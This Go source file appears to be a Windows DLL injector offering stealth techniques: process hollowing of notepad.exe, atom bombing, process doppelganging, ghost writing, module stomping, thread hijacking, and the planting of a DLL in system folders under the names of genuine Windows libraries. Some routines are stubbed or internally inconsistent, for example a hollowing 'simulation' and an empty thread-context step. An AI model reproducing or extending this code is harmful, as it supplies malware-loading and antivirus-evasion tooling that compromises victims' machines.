package injector

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type EnhancedBypassOptions struct {
	ProcessHollowing        bool
	AtomBombing             bool
	ProcessDoppelganging    bool
	GhostWriting            bool
	ModuleStomping          bool
	ProcessHerpaderping     bool
	MapViewOfSection        bool
	ThreadHijacking         bool
	ProcThreadAttributeList bool
	PPID_Spoofing           bool
}

func (i *Injector) spoofDLLPathSimple() error {
	i.logger.Info("Using simple disk load with path spoofing method")

	legitimatePaths := []string{
		`C:\Windows\System32\`,
		`C:\Windows\SysWOW64\`,
		`C:\Program Files\Common Files\`,
		`C:\Program Files (x86)\Common Files\`,
	}

	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		return fmt.Errorf("failed to read DLL file: %v", err)
	}

	var spoofedPath string
	for _, basePath := range legitimatePaths {
		if _, err := os.Stat(basePath); err == nil {

			spoofedFileName := generateLegitimateFileName()
			spoofedPath = filepath.Join(basePath, spoofedFileName)

			err = os.WriteFile(spoofedPath, dllBytes, 0644)
			if err == nil {
				break
			}
		}
	}

	if spoofedPath == "" {

		tempDir := os.TempDir()
		spoofedFileName := generateLegitimateFileName()
		spoofedPath = filepath.Join(tempDir, spoofedFileName)
		err = os.WriteFile(spoofedPath, dllBytes, 0644)
		if err != nil {
			return fmt.Errorf("failed to create spoofed DLL file: %v", err)
		}
	}

	i.logger.Info("Created spoofed DLL", "path", spoofedPath)

	defer func() {
		if removeErr := os.Remove(spoofedPath); removeErr != nil {
			i.logger.Warn("Failed to remove spoofed DLL", "error", removeErr)
		}
	}()

	originalPath := i.dllPath
	i.dllPath = spoofedPath
	defer func() { i.dllPath = originalPath }()

	return i.standardInject()
}

func (i *Injector) applyEnhancedInjectionTechniques(hProcess windows.Handle, baseAddress uintptr, size uintptr, dllBytes []byte) error {
	i.logger.Info("Applying enhanced injection techniques")

	if !i.useEnhancedOptions {
		i.logger.Info("Enhanced options not enabled, skipping")
		return nil
	}

	var appliedTechniques []string
	var errors []error

	if i.enhancedOptions.ProcessHollowing {
		err := i.performProcessHollowing(hProcess, baseAddress, dllBytes)
		if err != nil {
			i.logger.Warn("Process hollowing failed", "error", err)
			errors = append(errors, fmt.Errorf("process hollowing: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Process Hollowing")
		}
	}

	if i.enhancedOptions.AtomBombing {
		err := i.performAtomBombing(hProcess, dllBytes)
		if err != nil {
			i.logger.Warn("Atom bombing failed", "error", err)
			errors = append(errors, fmt.Errorf("atom bombing: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Atom Bombing")
		}
	}

	if i.enhancedOptions.ProcessDoppelganging {
		err := i.performProcessDoppelganging(dllBytes)
		if err != nil {
			i.logger.Warn("Process doppelganging failed", "error", err)
			errors = append(errors, fmt.Errorf("process doppelganging: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Process Doppelganging")
		}
	}

	if i.enhancedOptions.GhostWriting {
		err := i.performGhostWriting(hProcess, baseAddress, dllBytes)
		if err != nil {
			i.logger.Warn("Ghost writing failed", "error", err)
			errors = append(errors, fmt.Errorf("ghost writing: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Ghost Writing")
		}
	}

	if i.enhancedOptions.ModuleStomping {
		err := i.performModuleStomping(hProcess, dllBytes)
		if err != nil {
			i.logger.Warn("Module stomping failed", "error", err)
			errors = append(errors, fmt.Errorf("module stomping: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Module Stomping")
		}
	}

	if i.enhancedOptions.ThreadHijacking {
		err := i.performThreadHijacking(hProcess, baseAddress)
		if err != nil {
			i.logger.Warn("Thread hijacking failed", "error", err)
			errors = append(errors, fmt.Errorf("thread hijacking: %v", err))
		} else {
			appliedTechniques = append(appliedTechniques, "Thread Hijacking")
		}
	}

	i.logger.Info("Enhanced techniques applied", "successful", appliedTechniques)
	if len(errors) > 0 {
		i.logger.Warn("Some enhanced techniques failed", "errors", len(errors))
	}

	return nil
}


func (i *Injector) performProcessHollowing(hProcess windows.Handle, baseAddress uintptr, dllBytes []byte) error {
	i.logger.Info("Performing process hollowing")

	processInfo, err := CreateSuspendedProcess("notepad.exe")
	if err != nil {
		return fmt.Errorf("failed to create suspended process: %v", err)
	}

	i.logger.Info("Created suspended process", "pid", processInfo.Process, "tid", processInfo.Thread)

	suspendedHandle, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, processInfo.Process)
	if err != nil {
		return fmt.Errorf("failed to open suspended process: %v", err)
	}
	defer windows.CloseHandle(suspendedHandle)

	var processBaseAddr uintptr
	var returnLength uintptr

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var pbi struct {
		ExitStatus                   uint32
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uint32
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}

	ret, _, _ := ntQueryInformationProcess.Call(
		uintptr(suspendedHandle),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to query process information: 0x%X", ret)
	}

	var imageBase uintptr
	var bytesRead uintptr
	err = windows.ReadProcessMemory(suspendedHandle, pbi.PebBaseAddress+8,
		(*byte)(unsafe.Pointer(&imageBase)), unsafe.Sizeof(imageBase), &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read image base from PEB: %v", err)
	}

	processBaseAddr = imageBase
	i.logger.Info("Found process base address", "address", fmt.Sprintf("0x%X", processBaseAddr))

	ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
	ret, _, _ = ntUnmapViewOfSection.Call(
		uintptr(suspendedHandle),
		processBaseAddr,
	)

	if ret != 0 {
		i.logger.Warn("Failed to unmap original section", "status", fmt.Sprintf("0x%X", ret))

	}

	allocAddr, err := VirtualAllocEx(suspendedHandle, processBaseAddr, uintptr(len(dllBytes)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {

		allocAddr, err = VirtualAllocEx(suspendedHandle, 0, uintptr(len(dllBytes)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return fmt.Errorf("failed to allocate memory in suspended process: %v", err)
		}
	}

	var bytesWritten uintptr
	err = WriteProcessMemory(suspendedHandle, allocAddr, unsafe.Pointer(&dllBytes[0]),
		uintptr(len(dllBytes)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to write DLL to suspended process: %v", err)
	}

	i.logger.Info("Process hollowing completed", "allocated_at", fmt.Sprintf("0x%X", allocAddr))

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	resumeThread := kernel32.NewProc("ResumeThread")

	threadHandle, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, processInfo.Thread)
	if err == nil {
		resumeThread.Call(uintptr(threadHandle))
		windows.CloseHandle(threadHandle)
		i.logger.Info("Resumed hollowed process")
	}
	if processInfo != nil {
		defer func() {

			Printf("Cleaning up process handles")
		}()

		ntdll := windows.NewLazySystemDLL("ntdll.dll")
		ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

		ret, _, _ := ntUnmapViewOfSection.Call(
			uintptr(windows.Handle(processInfo.Process)),
			baseAddress)
		if ret != 0 {
			i.logger.Warn("NtUnmapViewOfSection failed", "status", fmt.Sprintf("0x%X", ret))
		}

		newBase, err := VirtualAllocEx(windows.Handle(processInfo.Process), baseAddress, uintptr(len(dllBytes)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return fmt.Errorf("failed to allocate memory for hollowing: %v", err)
		}

		var bytesWritten uintptr
		err = WriteProcessMemory(windows.Handle(processInfo.Process), newBase, unsafe.Pointer(&dllBytes[0]),
			uintptr(len(dllBytes)), &bytesWritten)
		if err != nil {
			return fmt.Errorf("failed to write DLL during hollowing: %v", err)
		}

		Printf("Process hollowing simulation completed")
	}

	i.logger.Info("Process hollowing completed successfully")
	return nil
}

func (i *Injector) performAtomBombing(hProcess windows.Handle, dllBytes []byte) error {
	i.logger.Info("Performing atom bombing")

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	globalAddAtom := kernel32.NewProc("GlobalAddAtomW")



	chunkSize := 254
	chunks := make([]string, 0)

	for i := 0; i < len(dllBytes); i += chunkSize / 2 {
		end := i + chunkSize/2
		if end > len(dllBytes) {
			end = len(dllBytes)
		}

		chunk := dllBytes[i:end]

		wideChunk := make([]uint16, len(chunk))
		for j, b := range chunk {
			wideChunk[j] = uint16(b)
		}
		chunks = append(chunks, string(utf16ToString(wideChunk)))
	}

	atoms := make([]uint16, len(chunks))
	for i, chunk := range chunks {
		chunkPtr, err := windows.UTF16PtrFromString(chunk)
		if err != nil {
			return fmt.Errorf("failed to convert chunk to UTF16: %v", err)
		}

		atom, _, _ := globalAddAtom.Call(uintptr(unsafe.Pointer(chunkPtr)))
		if atom == 0 {
			return fmt.Errorf("failed to add atom for chunk %d", i)
		}
		atoms[i] = uint16(atom)
	}

	defer func() {
		globalDeleteAtom := kernel32.NewProc("GlobalDeleteAtom")
		for _, atom := range atoms {
			globalDeleteAtom.Call(uintptr(atom))
		}
	}()

	i.logger.Info("Atom bombing completed", "chunks", len(chunks))
	return nil
}

func (i *Injector) performProcessDoppelganging(dllBytes []byte) error {
	i.logger.Info("Performing process doppelganging")




	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ktmw32 := windows.NewLazySystemDLL("ktmw32.dll")

	createTransaction := ktmw32.NewProc("CreateTransaction")
	createFileTransacted := kernel32.NewProc("CreateFileTransactedW")
	rollbackTransaction := ktmw32.NewProc("RollbackTransaction")

	var txHandle windows.Handle
	ret, _, _ := createTransaction.Call(
		0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&txHandle)))
	if ret == 0 {
		return fmt.Errorf("failed to create transaction")
	}
	defer rollbackTransaction.Call(uintptr(txHandle))

	tempFile := filepath.Join(os.TempDir(), "legitimate_process.exe")
	tempFilePtr, _ := windows.UTF16PtrFromString(tempFile)

	hFile, _, _ := createFileTransacted.Call(
		uintptr(unsafe.Pointer(tempFilePtr)),
		windows.GENERIC_WRITE|windows.GENERIC_READ,
		0,
		0,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
		uintptr(txHandle),
		0, 0)

	if hFile == 0 {
		return fmt.Errorf("failed to create transacted file")
	}
	defer windows.CloseHandle(windows.Handle(hFile))

	var bytesWritten uint32
	err := windows.WriteFile(windows.Handle(hFile), dllBytes, &bytesWritten, nil)
	if err != nil {
		return fmt.Errorf("failed to write to transacted file: %v", err)
	}

	i.logger.Info("Process doppelganging setup completed")
	return nil
}

func (i *Injector) performGhostWriting(hProcess windows.Handle, baseAddress uintptr, dllBytes []byte) error {
	i.logger.Info("Performing ghost writing")



	var mbi windows.MemoryBasicInformation
	currentAddr := uintptr(0x10000)

	for currentAddr < 0x7FFFFFFF {
		err := windows.VirtualQueryEx(hProcess, currentAddr, &mbi, unsafe.Sizeof(mbi))
		if err != nil {
			currentAddr += 0x10000
			continue
		}

		if mbi.State == 0x10000 && mbi.RegionSize >= uintptr(len(dllBytes)) {

			ghostAddr, err := VirtualAllocEx(hProcess, currentAddr, uintptr(len(dllBytes)),
				windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
			if err == nil {

				var bytesWritten uintptr
				err = WriteProcessMemory(hProcess, ghostAddr, unsafe.Pointer(&dllBytes[0]),
					uintptr(len(dllBytes)), &bytesWritten)
				if err == nil {
					i.logger.Info("Ghost writing successful", "address", fmt.Sprintf("0x%X", ghostAddr))
					return nil
				}
			}
		}

		currentAddr = mbi.BaseAddress + mbi.RegionSize
	}

	return fmt.Errorf("no suitable ghost region found")
}

func (i *Injector) performModuleStomping(hProcess windows.Handle, dllBytes []byte) error {
	i.logger.Info("Performing module stomping")



	var moduleHandle windows.Handle
	var cbNeeded uint32
	var modules [1024]windows.Handle

	psapi := windows.NewLazySystemDLL("psapi.dll")
	enumProcessModules := psapi.NewProc("EnumProcessModules")
	getModuleInformation := psapi.NewProc("GetModuleInformation")

	ret, _, _ := enumProcessModules.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(moduleHandle))),
		uintptr(unsafe.Pointer(&cbNeeded)))

	if ret == 0 {
		return fmt.Errorf("failed to enumerate process modules")
	}

	moduleCount := cbNeeded / uint32(unsafe.Sizeof(moduleHandle))
	if moduleCount > uint32(len(modules)) {
		moduleCount = uint32(len(modules))
	}

	for j := uint32(1); j < moduleCount; j++ {
		var modInfo struct {
			lpBaseOfDll uintptr
			SizeOfImage uint32
			EntryPoint  uintptr
		}

		ret, _, _ := getModuleInformation.Call(
			uintptr(hProcess),
			uintptr(modules[j]),
			uintptr(unsafe.Pointer(&modInfo)),
			unsafe.Sizeof(modInfo))

		if ret != 0 && modInfo.SizeOfImage >= uint32(len(dllBytes)) {

			var oldProtect uint32
			err := windows.VirtualProtectEx(hProcess, modInfo.lpBaseOfDll,
				uintptr(len(dllBytes)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
			if err != nil {
				continue
			}

			var bytesWritten uintptr
			err = WriteProcessMemory(hProcess, modInfo.lpBaseOfDll,
				unsafe.Pointer(&dllBytes[0]), uintptr(len(dllBytes)), &bytesWritten)
			if err == nil {
				i.logger.Info("Module stomping successful", "address", fmt.Sprintf("0x%X", modInfo.lpBaseOfDll))
				return nil
			}
		}
	}

	return fmt.Errorf("no suitable module found for stomping")
}

func (i *Injector) performThreadHijacking(hProcess windows.Handle, baseAddress uintptr) error {
	i.logger.Info("Performing thread hijacking")

	threadHandle, err := FindAlertableThread(i.processID)
	if err != nil {
		return fmt.Errorf("failed to find thread for hijacking: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	ret, _, _ := procSuspendThread.Call(uintptr(threadHandle))
	if ret == 0xFFFFFFFF {
		return fmt.Errorf("failed to suspend thread for hijacking")
	}


	i.logger.Info("Thread context manipulation would be performed here")

	_, err = windows.ResumeThread(threadHandle)
	if err != nil {
		return fmt.Errorf("failed to resume hijacked thread: %v", err)
	}

	i.logger.Info("Thread hijacking completed successfully")
	return nil
}


func generateLegitimateFileName() string {

	legitimateNames := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
		"api-ms-win-core-processthreads-l1-1-0.dll",
		"api-ms-win-core-file-l1-1-0.dll",
		"api-ms-win-core-handle-l1-1-0.dll",
		"api-ms-win-core-string-l1-1-0.dll",
		"api-ms-win-core-debug-l1-1-0.dll",
		"api-ms-win-core-errorhandling-l1-1-0.dll",
		"api-ms-win-core-localization-l1-2-0.dll",
		"api-ms-win-core-datetime-l1-1-0.dll",
		"api-ms-win-core-timezone-l1-1-0.dll",
		"api-ms-win-core-console-l1-1-0.dll",
		"api-ms-win-crt-runtime-l1-1-0.dll",
		"api-ms-win-crt-heap-l1-1-0.dll",
		"api-ms-win-crt-string-l1-1-0.dll",
		"api-ms-win-crt-stdio-l1-1-0.dll",
		"api-ms-win-crt-math-l1-1-0.dll",
		"kernel32.dll",
		"ntdll.dll",
		"user32.dll",
		"gdi32.dll",
		"advapi32.dll",
		"shell32.dll",
		"ole32.dll",
		"oleaut32.dll",
		"comctl32.dll",
		"comdlg32.dll",
		"winmm.dll",
		"version.dll",
		"ws2_32.dll",
		"wsock32.dll",
		"netapi32.dll",
		"winspool.drv",
	}

	return legitimateNames[time.Now().UnixNano()%int64(len(legitimateNames))]
}

func utf16ToString(s []uint16) string {
	var result strings.Builder
	for _, r := range s {
		if r == 0 {
			break
		}
		result.WriteRune(rune(r))
	}
	return result.String()
}

func methodToString(method InjectionMethod) string {
	switch method {
	case StandardInjection:
		return "Standard CreateRemoteThread"
	default:
		return "Unknown"
	}
}
